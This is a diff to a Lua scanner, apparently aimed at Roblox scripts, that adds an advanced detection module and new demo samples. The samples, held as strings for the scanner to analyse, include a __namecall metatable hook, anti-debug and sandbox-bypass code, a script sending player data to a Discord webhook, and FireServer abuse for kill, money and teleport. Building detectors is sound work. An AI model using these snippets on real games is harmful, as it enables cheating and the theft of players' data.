@@ -40,6 +40,7 @@ local ContinuousMonitor = require("modules.continuous_monitor")
 local PayloadDetector = require("modules.payload_detector")
 local FalsePositiveReducer = require("modules.false_positive_reducer")
 local ScannerGui = require("modules.gui")
+local AdvancedDetector = require("modules.advanced_detector")
 
 -- ============================================================
 -- Inicialização
@@ -110,6 +111,7 @@ local continuousMonitor = ContinuousMonitor.new(Config.ContinuousMonitor, logger
 local payloadDetector = PayloadDetector.new({}, logger)
 local falsePositiveReducer = FalsePositiveReducer.new(Config.FalsePositive, logger)
 local scannerGui = ScannerGui.new(Config.GUI, logger)
+local advancedDetector = AdvancedDetector.new(logger)
 
 logger:info("MAIN", "Todos os módulos avançados carregados", {
     signatures_count = signatureSystem:getSignatureCount(),
@@ -237,8 +239,7 @@ function ScanningLua.scanCode(code, sourceName)
     -- 4. Scan de assinaturas (#13)
     local signatureDetections = signatureSystem:scan(deobfuscatedCode, sourceName)
 
-    -- 5. Análise heurística (#14 + #22)
-    local heuristicResult = heuristicEngine:analyze(deobfuscatedCode, sourceName)
+    -- 5. (Heurística movida para step 5b abaixo - com contexto extra)
 
     -- 6. Análise de comportamento estático (#11)
     local behaviorDetections = behaviorAnalyzer:analyzeCodeBehavior(deobfuscatedCode, sourceName)
@@ -251,6 +252,29 @@ function ScanningLua.scanCode(code, sourceName)
 
     -- 9. Profiling para correlação (#23)
     scriptCorrelator:profileScript(deobfuscatedCode, sourceName)
+
+    -- 9b. Detecção avançada (Nível Absurdo)
+    local advancedResult = advancedDetector:scan(deobfuscatedCode, sourceName)
+
+    -- 9c. Detecção de padrões combinados perigosos
+    local comboDetections = vulnDetector:analyzeCombinedPatterns(deobfuscatedCode, sourceName)
+
+    -- 9d. Análise de URLs suspeitas
+    local urlDetections, urlScore, extractedUrls = vulnDetector:analyzeUrls(deobfuscatedCode, sourceName)
+
+    -- 9e. Análise de nomes suspeitos
+    local nameScore = vulnDetector:analyzeScriptName(sourceName, sourceName)
+
+    -- 9f. Detecção de anti-debug
+    local antiDebugDetections, antiDebugScore = vulnDetector:analyzeAntiDebug(deobfuscatedCode, sourceName)
+
+    -- 5b. Re-analisar heurística com contexto extra (URLs, nomes, anti-debug)
+    local extraContext = {
+        url_score = urlScore,
+        name_score = nameScore,
+        anti_debug_score = antiDebugScore,
+    }
+    local heuristicResult = heuristicEngine:analyze(deobfuscatedCode, sourceName, nil, extraContext)
 
     -- 10. Redução de falsos positivos (#26)
     local allAlerts = {}
@@ -301,6 +325,40 @@ function ScanningLua.scanCode(code, sourceName)
             alerts_passed = #passedAlerts,
             alerts_suppressed = #suppressedAlerts,
         },
+        -- Detecção avançada (Nível Absurdo)
+        advanced = {
+            findings = advancedResult.findings,
+            finding_count = advancedResult.finding_count,
+            score = advancedResult.score,
+            risk = advancedResult.risk,
+            obfuscation = advancedResult.obfuscation,
+            combos = advancedResult.combos,
+            combo_count = advancedResult.combo_count,
+            urls = advancedResult.urls,
+            anti_debug = advancedResult.anti_debug,
+            suspicious_names = advancedResult.suspicious_names,
+            remote_frequency = advancedResult.remote_frequency,
+        },
+        -- Padrões combinados
+        combined_patterns = {
+            detections = comboDetections,
+            count = #comboDetections,
+        },
+        -- URLs suspeitas
+        url_analysis = {
+            detections = urlDetections,
+            score = urlScore,
+            extracted_urls = extractedUrls,
+        },
+        -- Anti-debug
+        anti_debug = {
+            detections = antiDebugDetections,
+            score = antiDebugScore,
+        },
+        -- Nome suspeito
+        name_analysis = {
+            score = nameScore,
+        },
     }
 
     -- Atualizar cache incremental (#15)
@@ -313,14 +371,21 @@ function ScanningLua.scanCode(code, sourceName)
         source = sourceName,
         score = heuristicResult.score,
         level = heuristicResult.level,
+        advanced_score = advancedResult.score,
+        advanced_risk = advancedResult.risk,
         signatures = #signatureDetections,
         vulnerabilities = #vulnerabilities,
+        combos = #comboDetections,
+        url_score = urlScore,
+        anti_debug_score = antiDebugScore,
     })
 
     logger:info("MAIN", string.format(
-        "Análise concluída: %d padrões, %d vulns, %d assinaturas, score %d (%s)",
+        "Análise concluída: %d padrões, %d vulns, %d assinaturas, score %d (%s) | adv: %d (%s) | %d combos | urls:%d | anti_debug:%d",
         #filterMatches, #vulnerabilities, #signatureDetections,
-        heuristicResult.score, heuristicResult.level
+        heuristicResult.score, heuristicResult.level,
+        advancedResult.score, advancedResult.risk,
+        #comboDetections, urlScore, antiDebugScore
     ), result)
 
     return result
@@ -403,6 +468,7 @@ function ScanningLua.getStats()
         false_positive = falsePositiveReducer:getStats(),
         correlator = scriptCorrelator:getStats(),
         continuous = continuousMonitor:getStats(),
+        advanced = advancedDetector:getStats(),
     }
 end
 
@@ -420,6 +486,7 @@ function ScanningLua.reset()
     scriptCorrelator:reset()
     payloadDetector:reset()
     falsePositiveReducer:reset()
+    advancedDetector:reset()
     debugSystem:reset()
     logger:info("MAIN", "Todos os módulos resetados")
 end
@@ -455,7 +522,7 @@ end
 function ScanningLua.runDemo()
     print("")
     print("============================================")
-    print("  MODO DEMONSTRAÇÃO v3.0.0 ADVANCED")
+    print("  MODO DEMONSTRAÇÃO v3.0.0 ADVANCED + NÍVEL ABSURDO")
     print("  Executando com dados simulados")
     print("============================================")
     print("")
@@ -551,6 +618,56 @@ function ScanningLua.runDemo()
         loadstring(payload)()
     ]]
 
+    -- Código com exploit avançado (metatable + readonly bypass + hook)
+    local sampleCodeAdvancedExploit = [[
+        local mt = getrawmetatable(game)
+        local old = mt.__namecall
+        setreadonly(mt, false)
+        mt.__namecall = newcclosure(function(self, ...)
+            local method = getnamecallmethod()
+            if method == "FireServer" then
+                -- interceptar todos os FireServer
+                print("Intercepted:", self.Name)
+            end
+            return old(self, ...)
+        end)
+        setreadonly(mt, true)
+    ]]
+
+    -- Código com anti-debug e sandbox bypass
+    local sampleCodeAntiDebug = [[
+        -- Anti-scan techniques
+        local info = debug.getinfo(1)
+        debug.sethook(function() end, "c")
+        local env = getfenv(0)
+        setfenv(1, setmetatable({}, {__index = env}))
+        local dumped = string.dump(function() end)
+    ]]
+
+    -- Código com exfiltração via URL suspeita
+    local sampleCodeUrlExfil = [[
+        local Players = game:GetService("Players")
+        local HttpService = game:GetService("HttpService")
+        local player = Players.LocalPlayer
+        local data = HttpService:JSONEncode({
+            username = player.Name,
+            userId = player.UserId,
+            robux = player.leaderstats.Robux.Value
+        })
+        game:HttpPost("https://discord.com/api/webhooks/123456/abcdef", data)
+    ]]
+
+    -- Código com nome suspeito + FireServer spam (abuso de remotes)
+    local sampleCodeRemoteSpam = [[
+        local speed = 100
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speed
+        game:GetService("ReplicatedStorage").RemoteEvent:FireServer("speed", speed)
+        game:GetService("ReplicatedStorage").RemoteEvent:FireServer("damage", 999)
+        game:GetService("ReplicatedStorage").RemoteEvent:FireServer("kill", true)
+        game:GetService("ReplicatedStorage").RemoteEvent:FireServer("money", 99999)
+        game:GetService("ReplicatedStorage").RemoteEvent:FireServer("teleport", Vector3.new(0,100,0))
+    ]]
+
     -- Executar análise
     print("\n--- Analisando Amostra 1: Exfiltração de dados ---")
     local result1 = ScanningLua.scanCode(sampleCode1, "sample_data_exfiltration.lua")
@@ -572,6 +689,18 @@ function ScanningLua.runDemo()
 
     print("\n--- Analisando Amostra 7: Cadeia executor (parte 2) ---")
     local result7 = ScanningLua.scanCode(sampleCodeChain2, "chain_executor.lua")
+
+    print("\n--- Analisando Amostra 8: Exploit avançado (metatable + hook + readonly bypass) ---")
+    local result8 = ScanningLua.scanCode(sampleCodeAdvancedExploit, "advanced_exploit.lua")
+
+    print("\n--- Analisando Amostra 9: Anti-debug / Anti-scan ---")
+    local result9 = ScanningLua.scanCode(sampleCodeAntiDebug, "anti_debug_evasion.lua")
+
+    print("\n--- Analisando Amostra 10: Exfiltração via Discord webhook ---")
+    local result10 = ScanningLua.scanCode(sampleCodeUrlExfil, "discord_exfiltration.lua")
+
+    print("\n--- Analisando Amostra 11: Script com nome suspeito + FireServer spam ---")
+    local result11 = ScanningLua.scanCode(sampleCodeRemoteSpam, "speed_hack_kill_money.lua")
 
     -- Executar correlação entre scripts (#23)
     print("\n--- Correlacionando scripts ---")
@@ -697,6 +826,49 @@ function ScanningLua.runDemo()
         end
     end
 
+    -- Exibir resultados do Advanced Detector (Nível Absurdo)
+    print("\n--- Detecção Avançada (Nível Absurdo) ---")
+    local advHistory = advancedDetector:getScanHistory()
+    for _, scan in ipairs(advHistory) do
+        if scan.score > 0 then
+            local riskEmoji = scan.risk == "CRITICAL" and "⚫" or
+                              scan.risk == "HIGH" and "🔴" or
+                              scan.risk == "MEDIUM" and "🟠" or "🟡"
+            print(string.format("  %s %s: score=%d (%s) | %d findings | %d combos | obf=%d",
+                riskEmoji, scan.script, scan.score, scan.risk,
+                scan.finding_count, scan.combo_count, scan.obfuscation.score))
+
+            -- Mostrar combos perigosos
+            for _, combo in ipairs(scan.combos) do
+                print(string.format("    💥 COMBO: %s → %s", combo.name, combo.attack))
+            end
+
+            -- Mostrar URLs suspeitas
+            for _, urlF in ipairs(scan.urls.suspicious or {}) do
+                print(string.format("    🌐 URL: %s (score +%d)", urlF.reason, urlF.score))
+            end
+
+            -- Mostrar anti-debug
+            for _, ad in ipairs(scan.anti_debug) do
+                print(string.format("    🧪 ANTI-DEBUG: %s", ad.name))
+            end
+
+            -- Mostrar top findings (max 3)
+            local shown = 0
+            for _, f in ipairs(scan.findings) do
+                if shown < 3 and (f.risk == "CRITICAL" or f.risk == "HIGH") then
+                    print(string.format("    💣 L%d [%s] %s → %s",
+                        f.line, f.risk, f.reason, f.attack))
+                    shown = shown + 1
+                end
+            end
+        end
+    end
+    local advStats = advancedDetector:getStats()
+    print(string.format("  📊 Total: %d scans | %d findings | %d combos | max score: %d | avg: %.1f",
+        advStats.total_scanned, advStats.total_findings,
+        advStats.combos_detected, advStats.max_score, advStats.average_score))
+
     -- Performance summary
     print("\n--- Performance ---")
     print(string.format("  Tempo total demo: %.3fs", demoTime or 0))
@@ -714,7 +886,7 @@ function ScanningLua.runDemo()
     end)
 
     print("\n============================================")
-    print("  DEMONSTRAÇÃO v3.0.0 CONCLUÍDA")
+    print("  DEMONSTRAÇÃO v3.0.0 NÍVEL ABSURDO CONCLUÍDA")
     print("  Verifique os diretórios 'logs/' e 'reports/'")
     print("============================================")
 
@@ -799,6 +971,18 @@ end
 --- @return table
 function ScanningLua.getHeuristicAnalyses()
     return heuristicEngine:getAnalyses()
+end
+
+--- Retorna resultados do Advanced Detector (Nível Absurdo)
+--- @return table Histórico de scans avançados
+function ScanningLua.getAdvancedDetections()
+    return advancedDetector:getScanHistory()
+end
+
+--- Retorna estatísticas do Advanced Detector
+--- @return table
+function ScanningLua.getAdvancedStats()
+    return advancedDetector:getStats()
 end
 
 --- Replay de eventos de debug (#20)
